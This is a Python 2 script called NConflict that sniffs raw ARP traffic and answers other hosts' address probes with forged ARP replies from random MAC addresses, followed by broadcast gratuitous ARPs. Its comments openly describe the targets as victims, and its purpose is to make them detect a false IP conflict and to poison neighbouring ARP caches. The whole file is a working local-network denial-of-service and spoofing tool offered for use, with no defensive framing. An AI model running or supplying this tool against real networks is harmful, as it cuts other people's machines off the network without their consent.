
#NConflict - Duplicate IP Generator in Python
#Response to any ARP probes and fool the victim to detect ip conflict
#NConflict - Conflicting network with some simple tricks : https://github.com/nimafia/NConflict

import socket
import struct
import binascii
import random
from scapy.all import (
    ARP,
    Ether,
    sendp
)

#Function For Generating Random Mac Address
def randomMAC():
    return [ 0x00, 0x16, 0x3e,
        random.randint(0x00, 0x7f),
        random.randint(0x00, 0xff),
        random.randint(0x00, 0xff) ]
		
def MACprettyprint(mac):
    return ':'.join(map(lambda x: "%02x" % x, mac))
	
#Convert a string of 6 characters of ethernet address into a dash separated hex string
def eth_addr (a) :
  b = "%.2x:%.2x:%.2x:%.2x:%.2x:%.2x" % (ord(a[0]) , ord(a[1]) , ord(a[2]), ord(a[3]), ord(a[4]) , ord(a[5]))
  return b

#-------------Sniffing Incoming Packets and geting some require informations----------------
try:
    rawSocket = socket.socket( socket.AF_PACKET , socket.SOCK_RAW , socket.ntohs(0x0003))
except socket.error , msg:
    print 'Socket could not be created. Error Code : ' + str(msg[0]) + ' Message ' + msg[1]
    sys.exit()

# receive a packet
while True:

    packet = rawSocket.recvfrom(2048)

    ethernet_header = packet[0][0:14]
    ethernet_detailed = struct.unpack("!6s6s2s", ethernet_header)

    arp_header = packet[0][14:42]
    arp_detailed = struct.unpack("2s2s1s1s2s6s4s6s4s", arp_header)

    #skip non-ARP packets
    ethertype = ethernet_detailed[2]
    if ethertype != '\x08\x06':
        continue

	#Ethernet Frame
    dst_mac = eth_addr(binascii.hexlify(ethernet_detailed[0]))
    src_mac = eth_addr(binascii.hexlify(ethernet_detailed[1]))
    #eth_type = binascii.hexlify(ethertype)
	
	#ARP Header
    op = binascii.hexlify(arp_detailed[4])
    src_ip = socket.inet_ntoa(arp_detailed[6])
    dst_ip = socket.inet_ntoa(arp_detailed[8])
	#getting first 3 characters of ip string for avoiding reaction to 169 ip range probes...
    f3_ip = dst_ip[:3]
    #hw_type = binascii.hexlify(arp_detailed[0])
    #protocol = binascii.hexlify(arp_detailed[1])
    #hw_size = binascii.hexlify(arp_detailed[2])
    #protocol_size = binascii.hexlify(arp_detailed[3])
    #arp_hwsrc = binascii.hexlify(arp_detailed[5])
    #arp_hwdst = binascii.hexlify(arp_detailed[7])
	
    #print ' Destination MAC : ' + str(dst_mac) + ' Source MAC : ' + str(src_mac) + ' Op Code : ' + str(op) + ' Source IP : ' + str(src_ip) + ' Destination IP : ' + str(dst_ip) + ' Protocol : ' + str(protocol)
	
    if (src_ip == '0.0.0.0') & (op == '0001') &  (f3_ip != '169'):
		
		#generating random mac address
        rmac = MACprettyprint(randomMAC())
               
        #Responds directly to a victim to make it detect IP conflict.
        pkt = Ether(dst=src_mac, src=rmac) / ARP(op=2 , hwsrc=rmac, psrc=dst_ip, pdst='0.0.0.0', hwdst=src_mac)
        pkt.show()
        sendp(pkt)
                        
        #Gratuitous ARP to update ARP mapping for all the nodes
        grarp = Ether(dst='ff:ff:ff:ff:ff:ff', src=rmac) / ARP(op=2 , hwsrc=rmac, psrc=dst_ip, pdst=dst_ip, hwdst=rmac)
        #grarp.show()
        sendp(grarp, count=2)
